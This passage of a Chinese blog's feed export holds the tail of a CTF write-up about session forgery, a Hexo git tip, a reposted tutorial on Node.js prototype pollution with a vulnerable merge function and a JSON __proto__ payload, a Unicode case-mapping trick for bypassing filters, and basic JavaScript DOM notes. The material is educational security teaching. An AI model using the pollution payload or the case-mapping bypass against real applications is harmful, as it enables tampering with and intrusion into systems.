class="line">print(b64encode(u).decode())</span><br></pre></td></tr></table></figure>


<p><img src="http://img.npfs06.top/20210505185415.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>将session替换掉</p>
<p><img src="http://img.npfs06.top/20210506132202.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
]]></content>
      <categories>
        <category>Write up</category>
      </categories>
  </entry>
  <entry>
    <title>Hexo如何删除git commit历史记录</title>
    <url>/2021/02/26/Hexo%E5%A6%82%E4%BD%95%E5%88%A0%E9%99%A4git-commit%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>有时博客发布之后，会对博客内容再进行修改，如果不想要别人看到 Hexo 博客的修<a id="more"></a>改历史，只保留最后的版本，那我们可以把以前的 git commit 历史记录清理掉，这样还可以减少占用的 Pages 空间。操作步骤如下：</p>
<blockquote>
<p>删除博客根目录下的 .deploy_git 文件夹。为防意外删前最好备份一下，git commit 历史记录就保存在这个文件夹</p>
</blockquote>
<p>在 Git Bash 或终端中执行命令：</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hexo clean</span></span><br></pre></td></tr></table></figure>
<p>在 Git Bash 或终端中执行命令：</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hexo d -g</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>problems</category>
      </categories>
  </entry>
  <entry>
    <title>Nodejs原型链污染</title>
    <url>/2020/12/29/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    <content><![CDATA[<h2 id><a href="#" class="headerlink" title></a></h2><p>JavaScript是一门非常灵活的语言，我感觉在某些方面可能比PHP更加灵活。所以，除了传统的SQL注入、代码执行等注入型漏洞外，也会有一些独有的安全问题，比如今天要说这个prototype污染。<a id="more"></a></p>
<h3 id="prototype和-proto-分别是什么？"><a href="#prototype和-proto-分别是什么？" class="headerlink" title="prototype和__proto__分别是什么？"></a><code>prototype</code>和<code>__proto__</code>分别是什么？</h3><p>JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义：</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.bar = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Foo()</span><br></pre></td></tr></table></figure>
<p><code>Foo</code>函数的内容，就是<code>Foo</code>类的构造函数，而<code>this.bar</code>就是<code>Foo</code>类的一个属性。</p>
<blockquote>
<p>为了简化编写JavaScript代码，ECMAScript 6后增加了<code>class</code>语法，但<code>class</code>其实只是一个语法糖。</p>
</blockquote>
<p>一个类必然有一些方法，类似属性<code>this.bar</code>，我们也可以将方法定义在构造函数内部：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.bar = <span class="number">1</span></span><br><span class="line">    <span class="built_in">this</span>.show = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.bar)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> Foo()).show()</span><br></pre></td></tr></table></figure>
<p>但这样写有一个问题，就是每当我们新建一个Foo对象时，<code>this.show = function...</code>就会执行一次，这个<code>show</code>方法实际上是绑定在对象上的，而不是绑定在“类”中。</p>
<p>我希望在创建类的时候只创建一次<code>show</code>方法，这时候就则需要使用原型（prototype）了：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.bar = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Foo.prototype.show = <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.bar)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> Foo()</span><br><span class="line">foo.show()</span><br></pre></td></tr></table></figure>
<p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/46109c07-bfa1-4b92-93a2-d86049274035.png"><img src="https://www.leavesongs.com/media/attachment/2019/04/03/46109c07-bfa1-4b92-93a2-d86049274035.0dcd4f4c4400.png" alt="image.png"></a></p>
<p>我们可以认为原型<code>prototype</code>是类<code>Foo</code>的一个属性，而所有用<code>Foo</code>类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的<code>foo</code>对象，其天生就具有<code>foo.show()</code>方法。</p>
<p>我们可以通过<code>Foo.prototype</code>来访问<code>Foo</code>类的原型，但<code>Foo</code>实例化出来的对象，是不能通过prototype访问原型的。这时候，就该<code>__proto__</code>登场了。</p>
<p>一个Foo类实例化出来的foo对象，可以通过<code>foo.__proto__</code>属性来访问Foo类的原型，也就是说：</p>
<figure class="highlight elm"><table><tr><td class="code"><pre><span class="line"><span class="title">foo</span>.__proto__ == <span class="type">Foo</span>.proto<span class="keyword">type</span></span><br></pre></td></tr></table></figure>
<p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/3c4ed224-ae7b-4c8c-b16d-12b56524efee.png"><img src="https://www.leavesongs.com/media/attachment/2019/04/03/3c4ed224-ae7b-4c8c-b16d-12b56524efee.e270c75493b0.png" alt="image.png"></a></p>
<p>所以，总结一下：</p>
<ol>
<li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li>
<li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li>
</ol>
<h3 id="JavaScript原型链继承"><a href="#JavaScript原型链继承" class="headerlink" title="JavaScript原型链继承"></a>JavaScript原型链继承</h3><p>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制。</p>
<p>比如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.first_name = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="built_in">this</span>.last_name = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.first_name = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Son.prototype = <span class="keyword">new</span> Father()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> Son()</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure>
<p>Son类继承了Father类的<code>last_name</code>属性，最后输出的是<code>Name: Melania Trump</code>。</p>
<p>总结一下，对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：</p>
<ol>
<li>在对象son中寻找last_name</li>
<li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li>
<li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li>
<li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li>
</ol>
<p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/08c5d5d0-62da-40f9-9e2c-77831fa7488e.png"><img src="https://www.leavesongs.com/media/attachment/2019/04/03/08c5d5d0-62da-40f9-9e2c-77831fa7488e.51324dd04eef.png" alt="image.png"></a></p>
<p>JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。</p>
<p>以上就是最基础的JavaScript面向对象编程，我们并不深入研究更细节的内容，只要牢记以下几点即可：</p>
<ol>
<li>每个构造函数(constructor)都有一个原型对象(prototype)</li>
<li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li>
<li>JavaScript使用prototype链实现继承机制</li>
</ol>
<h3 id="原型链污染是什么"><a href="#原型链污染是什么" class="headerlink" title="原型链污染是什么"></a>原型链污染是什么</h3><p>第一章中说到，<code>foo.__proto__</code>指向的是<code>Foo</code>类的<code>prototype</code>。那么，如果我们修改了<code>foo.__proto__</code>中的值，是不是就可以修改Foo类呢？</p>
<p>做个简单的实验：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span> foo是一个简单的JavaScript对象</span><br><span class="line">let foo = &#123;bar: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> foo.bar 此时为<span class="number">1</span></span><br><span class="line">console.log(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 修改foo的原型（即Object）</span><br><span class="line">foo.__proto__.bar = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 由于查找顺序的原因，foo.bar仍然是<span class="number">1</span></span><br><span class="line">console.log(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 此时再用Object创建一个空的zoo对象</span><br><span class="line">let zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 查看zoo.bar</span><br><span class="line">console.log(zoo.bar)</span><br></pre></td></tr></table></figure>
<p>最后，虽然zoo是一个<strong>空</strong>对象<code>&#123;&#125;</code>，但<code>zoo.bar</code>的结果居然是2：</p>
<p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/4b63f1ef-6ed8-4448-9644-f11620822aaf.png"><img src="https://www.leavesongs.com/media/attachment/2019/04/03/4b63f1ef-6ed8-4448-9644-f11620822aaf.2b2425c31fdb.png" alt="image.png"></a></p>
<p>原因也显而易见：因为前面我们修改了foo的原型<code>foo.__proto__.bar = 2</code>，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。</p>
<p>后来，我们又用Object类创建了一个zoo对象<code>let zoo = &#123;&#125;</code>，zoo对象自然也有一个bar属性了。</p>
<p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p>
<h3 id="哪些情况下原型链会被污染？"><a href="#哪些情况下原型链会被污染？" class="headerlink" title="哪些情况下原型链会被污染？"></a>哪些情况下原型链会被污染？</h3><p>在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？</p>
<p>我们思考一下，哪些情况下我们可以设置<code>__proto__</code>的值呢？其实找找能够控制数组（对象）的“键名”的操作即可：</p>
<ul>
<li>对象merge</li>
<li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li>
</ul>
<p>以对象merge为例，我们想象一个简单的merge函数：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">function <span class="keyword">merge</span>(target, source) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> <span class="keyword">key</span> <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">key</span> <span class="keyword">in</span> source &amp;&amp; <span class="keyword">key</span> <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="keyword">merge</span>(target[<span class="keyword">key</span>], source[<span class="keyword">key</span>])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[<span class="keyword">key</span>] = source[<span class="keyword">key</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在合并的过程中，存在赋值的操作<code>target[key] = source[key]</code>，那么，这个key如果是<code>__proto__</code>，是不是就可以原型链污染呢？</p>
<p>我们用如下代码实验一下：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">let</span> o<span class="number">1</span> = &#123;&#125;</span><br><span class="line"><span class="attribute">let</span> o<span class="number">2</span> = &#123;a: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;b: <span class="number">2</span>&#125;&#125;</span><br><span class="line"><span class="attribute">merge</span>(o<span class="number">1</span>, o<span class="number">2</span>)</span><br><span class="line"><span class="attribute">console</span>.log(o<span class="number">1</span>.a, o<span class="number">1</span>.b)</span><br><span class="line"></span><br><span class="line"><span class="attribute">o3</span> = &#123;&#125;</span><br><span class="line"><span class="attribute">console</span>.log(o<span class="number">3</span>.b)</span><br></pre></td></tr></table></figure>
<p>结果是，合并虽然成功了，但原型链没有被污染：</p>
<p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/ba16d965-3112-4f69-bf5e-4eddb034e6dc.png"><img src="https://www.leavesongs.com/media/attachment/2019/04/03/ba16d965-3112-4f69-bf5e-4eddb034e6dc.c5e82ea6e4f5.png" alt="image.png"></a></p>
<p>这是因为，我们用JavaScript创建o2的过程（<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p>
<p>那么，如何让<code>__proto__</code>被认为是一个键名呢？</p>
<p>我们将代码改成如下：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">let</span> o<span class="number">1</span> = &#123;&#125;</span><br><span class="line"><span class="attribute">let</span> o<span class="number">2</span> = JSON.parse(&#x27;&#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;b&quot;</span>: <span class="number">2</span>&#125;&#125;&#x27;)</span><br><span class="line"><span class="attribute">merge</span>(o<span class="number">1</span>, o<span class="number">2</span>)</span><br><span class="line"><span class="attribute">console</span>.log(o<span class="number">1</span>.a, o<span class="number">1</span>.b)</span><br><span class="line"></span><br><span class="line"><span class="attribute">o3</span> = &#123;&#125;</span><br><span class="line"><span class="attribute">console</span>.log(o<span class="number">3</span>.b)</span><br></pre></td></tr></table></figure>
<p>可见，新建的o3对象，也存在b属性，说明Object已经被污染：</p>
<p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/5e05a46f-3c7b-4ab4-869c-fe6fd19422b7.png"><img src="https://www.leavesongs.com/media/attachment/2019/04/03/5e05a46f-3c7b-4ab4-869c-fe6fd19422b7.64db1b9bbae7.png" alt="image.png"></a></p>
<p>这是因为，JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p>
<p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。</p>
<hr>
<h2 id="Fuzz中的javascript大小写特性"><a href="#Fuzz中的javascript大小写特性" class="headerlink" title="Fuzz中的javascript大小写特性"></a>Fuzz中的javascript大小写特性</h2><p>某比赛实在有点坑人，题目涉嫌抄袭不说，还不停改来改去。算了不吐槽了，说一则javascript小特性吧。</p>
<p>​    toUpperCase()是javascript中将小写转换成大写的函数。toLowerCase()是javascript中将大写转换成小写的函数。但是这俩函数真的只有这两个功能么？</p>
<p>​    不如我们来fuzz一下，看看toUpperCase功能如何？</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">String</span>.fromCodePoint) &#123;</span><br><span class="line">	(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">var</span> defineProperty = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="comment">// IE 8 only supports `Object.defineProperty` on DOM elements</span></span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				<span class="keyword">var</span> <span class="keyword">object</span> = &#123;&#125;;</span><br><span class="line">				<span class="keyword">var</span> <span class="variable">$defineProperty</span> = <span class="keyword">Object</span>.defineProperty;</span><br><span class="line">				<span class="keyword">var</span> result = <span class="variable">$defineProperty</span>(<span class="keyword">object</span>, <span class="keyword">object</span>, <span class="keyword">object</span>) &amp;&amp; <span class="variable">$defineProperty</span>;</span><br><span class="line">			&#125; <span class="keyword">catch</span>(<span class="built_in">error</span>) &#123;&#125;</span><br><span class="line">			<span class="keyword">return</span> result;</span><br><span class="line">		&#125;());</span><br><span class="line">		<span class="keyword">var</span> stringFromCharCode = <span class="keyword">String</span>.fromCharCode;</span><br><span class="line">		<span class="keyword">var</span> floor = Math.floor;</span><br><span class="line">		<span class="keyword">var</span> fromCodePoint = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">var</span> MAX_SIZE = <span class="number">0x4000</span>;</span><br><span class="line">			<span class="keyword">var</span> codeUnits = [];</span><br><span class="line">			<span class="keyword">var</span> highSurrogate;</span><br><span class="line">			<span class="keyword">var</span> lowSurrogate;</span><br><span class="line">			<span class="keyword">var</span> index = <span class="number">-1</span>;</span><br><span class="line">			<span class="keyword">var</span> length = arguments.length;</span><br><span class="line">			<span class="keyword">if</span> (!length) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">var</span> result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">			<span class="keyword">while</span> (++index &lt; length) &#123;</span><br><span class="line">				<span class="keyword">var</span> codePoint = Number(arguments[index]);</span><br><span class="line">				<span class="keyword">if</span> (</span><br><span class="line">					!isFinite(codePoint) || <span class="comment">// `NaN`, `+Infinity`, or `-Infinity`</span></span><br><span class="line">					codePoint &lt; <span class="number">0</span> || <span class="comment">// not a valid Unicode code point</span></span><br><span class="line">					codePoint &gt; <span class="number">0x10FFFF</span> || <span class="comment">// not a valid Unicode code point</span></span><br><span class="line">					floor(codePoint) != codePoint <span class="comment">// not an integer</span></span><br><span class="line">				) &#123;</span><br><span class="line">					<span class="keyword">throw</span> RangeError(<span class="string">&#x27;Invalid code point: &#x27;</span> + codePoint);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (codePoint &lt;= <span class="number">0xFFFF</span>) &#123; <span class="comment">// BMP code point</span></span><br><span class="line">					codeUnits.push(codePoint);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123; <span class="comment">// Astral code point; split in surrogate halves</span></span><br><span class="line">					<span class="comment">// http://mathiasbynens.be/notes/javascript-encoding#surrogate-formulae</span></span><br><span class="line">					codePoint -= <span class="number">0x10000</span>;</span><br><span class="line">					highSurrogate = (codePoint &gt;&gt; <span class="number">10</span>) + <span class="number">0xD800</span>;</span><br><span class="line">					lowSurrogate = (codePoint % <span class="number">0x400</span>) + <span class="number">0xDC00</span>;</span><br><span class="line">					codeUnits.push(highSurrogate, lowSurrogate);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (index + <span class="number">1</span> == length || codeUnits.length &gt; MAX_SIZE) &#123;</span><br><span class="line">					result += stringFromCharCode.apply(<span class="literal">null</span>, codeUnits);</span><br><span class="line">					codeUnits.length = <span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> result;</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="keyword">if</span> (defineProperty) &#123;</span><br><span class="line">			defineProperty(<span class="keyword">String</span>, <span class="string">&#x27;fromCodePoint&#x27;</span>, &#123;</span><br><span class="line">				<span class="string">&#x27;value&#x27;</span>: fromCodePoint,</span><br><span class="line">				<span class="string">&#x27;configurable&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">				<span class="string">&#x27;writable&#x27;</span>: <span class="literal">true</span></span><br><span class="line">			&#125;);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">String</span>.fromCodePoint = fromCodePoint;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="string">&#x27;A&#x27;</span>.charCodeAt(); j &lt;= <span class="string">&#x27;Z&#x27;</span>.charCodeAt(); j++)&#123;</span><br><span class="line">	<span class="keyword">var</span> s = <span class="keyword">String</span>.fromCodePoint(j);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10FFFF</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">var</span> e = <span class="keyword">String</span>.fromCodePoint(i);</span><br><span class="line">		<span class="keyword">if</span> (s == e.toUpperCase() &amp;&amp; s != e) &#123;</span><br><span class="line">			document.write(<span class="string">&quot;char: &quot;</span>+e+<span class="string">&quot;&lt;br/&gt;&quot;</span>);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    结果我们可以看到：</p>
<p>​    <a href="https://www.leavesongs.com/content/uploadfile/201409/a0171411234653.jpg"><img src="https://www.leavesongs.com/content/uploadfile/201409/a0171411234653.jpg" alt="001.jpg"></a></p>
<p>​    其中混入了两个奇特的字符”ı”、”ſ”。</p>
<p>​    <strong>这两个字符的“大写”是I和S。也就是说”ı”.toUpperCase() == ‘I’，”ſ”.toUpperCase() == ‘S’。通过这个小特性可以绕过一些限制。</strong></p>
<p>​    同样，toLowerCase也有同样的字符：</p>
<p>​    <a href="https://www.leavesongs.com/content/uploadfile/201409/11f51411234890.jpg"><img src="https://www.leavesongs.com/content/uploadfile/201409/11f51411234890.jpg" alt="002.jpg"></a></p>
<p>​    <strong>这个”K”的“小写”字符是k，也就是”K”.toLowerCase() == ‘k’.</strong></p>
<p>​    用这个特性可以完成 <a href="http://prompt.ml/9">http://prompt.ml/9</a> 。还有某比赛的神题，当然有更简单的方法。</p>
<p>转载自：P神的<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript" target="_blank">深入理解 JavaScript Prototype 污染攻击</a></p>
]]></content>
      <categories>
        <category>web</category>
        <category>share</category>
      </categories>
  </entry>
  <entry>
    <title>JavaScript</title>
    <url>/2020/04/05/JavaScript/</url>
    <content><![CDATA[<p>以前学js时做的笔记,其实也没写什么<a id="more"></a></p>
<h4 id="DOMO事件处理程序"><a href="#DOMO事件处理程序" class="headerlink" title="DOMO事件处理程序"></a>DOMO事件处理程序</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id=<span class="string">&quot;div&quot;</span>&gt;</span><br><span class="line">        &lt;button type=<span class="string">&quot;submit&quot;</span> id=<span class="string">&quot;btn&quot;</span>&gt;提交&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> dtn = <span class="built_in">document</span>.getElementById(<span class="string">&quot;btn&quot;</span>).onclick =  <span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params"></span>)</span>&#123;alert(<span class="string">&quot;DOMO级事件处理程序&quot;</span>);&#125;     <span class="comment">//会被覆盖</span></span><br><span class="line"> </span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id=<span class="string">&quot;div&quot;</span>&gt;</span><br><span class="line">        &lt;button type=<span class="string">&quot;submit&quot;</span> id=<span class="string">&quot;btn&quot;</span>&gt;提交&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> dtn = <span class="built_in">document</span>.getElementById(<span class="string">&quot;btn&quot;</span>).addEventListener(<span class="string">&quot;click&quot;</span>,demo)</span><br><span class="line">    <span class="keyword">var</span> dtn = <span class="built_in">document</span>.getElementById(<span class="string">&quot;btn&quot;</span>).addEventListener(<span class="string">&quot;click&quot;</span>,demo1)  <span class="comment">//不会被覆盖</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            alert(<span class="string">&quot;DOMO2级事件处理程序&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">demo1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            alert(<span class="string">&quot;DOMO2事件处理程序&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">&quot;btn&quot;</span>).removeEventListener(<span class="string">&quot;click&quot;</span>,demo1)  <span class="comment">//移去该事件处理程序</span></span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>




<h4 id="事件对象"><a href="#事件对象" class="headerlink" title="事件对象"></a>事件对象</h4><p>在触发DOM事件的时候都会产生一个对象</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">事件对象event：</span><br><span class="line"></span><br><span class="line"><span class="section">1.type:获取事件类型</span></span><br><span class="line"><span class="section">2.target:获取事件目标</span></span><br><span class="line"><span class="section">3.stopPropagation():阻止事件冒泡</span></span><br><span class="line"><span class="section">4.preventDefault():阻止事件默认行为</span></span><br></pre></td></tr></table></figure>




<h4 id="DATE对象"><a href="#DATE对象" class="headerlink" title="DATE对象"></a>DATE对象</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body onload=<span class="string">&quot;startTime()&quot;</span>&gt;</span><br><span class="line">    &lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">startTime</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">            <span class="keyword">var</span> h = d.getHours();</span><br><span class="line">            <span class="keyword">var</span> m = d.getMinutes();</span><br><span class="line">            <span class="keyword">var</span> s = d.getSeconds();</span><br><span class="line">            <span class="keyword">var</span> t = <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">               startTime(); </span><br><span class="line">            &#125;, <span class="number">500</span>);</span><br><span class="line">            m = checktime(m);</span><br><span class="line">            s = checktime(s);</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;asd&quot;</span>).innerHTML=h+<span class="string">&quot;:&quot;</span>+m+<span class="string">&quot;:&quot;</span>+s;</span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">checktime</span>(<span class="params">i</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(i&lt;<span class="number">10</span>)&#123;</span><br><span class="line">                i = <span class="string">&quot;0&quot;</span>+i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line"></span><br><span class="line">        &#125;    </span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">        &lt;div id=<span class="string">&quot;asd&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
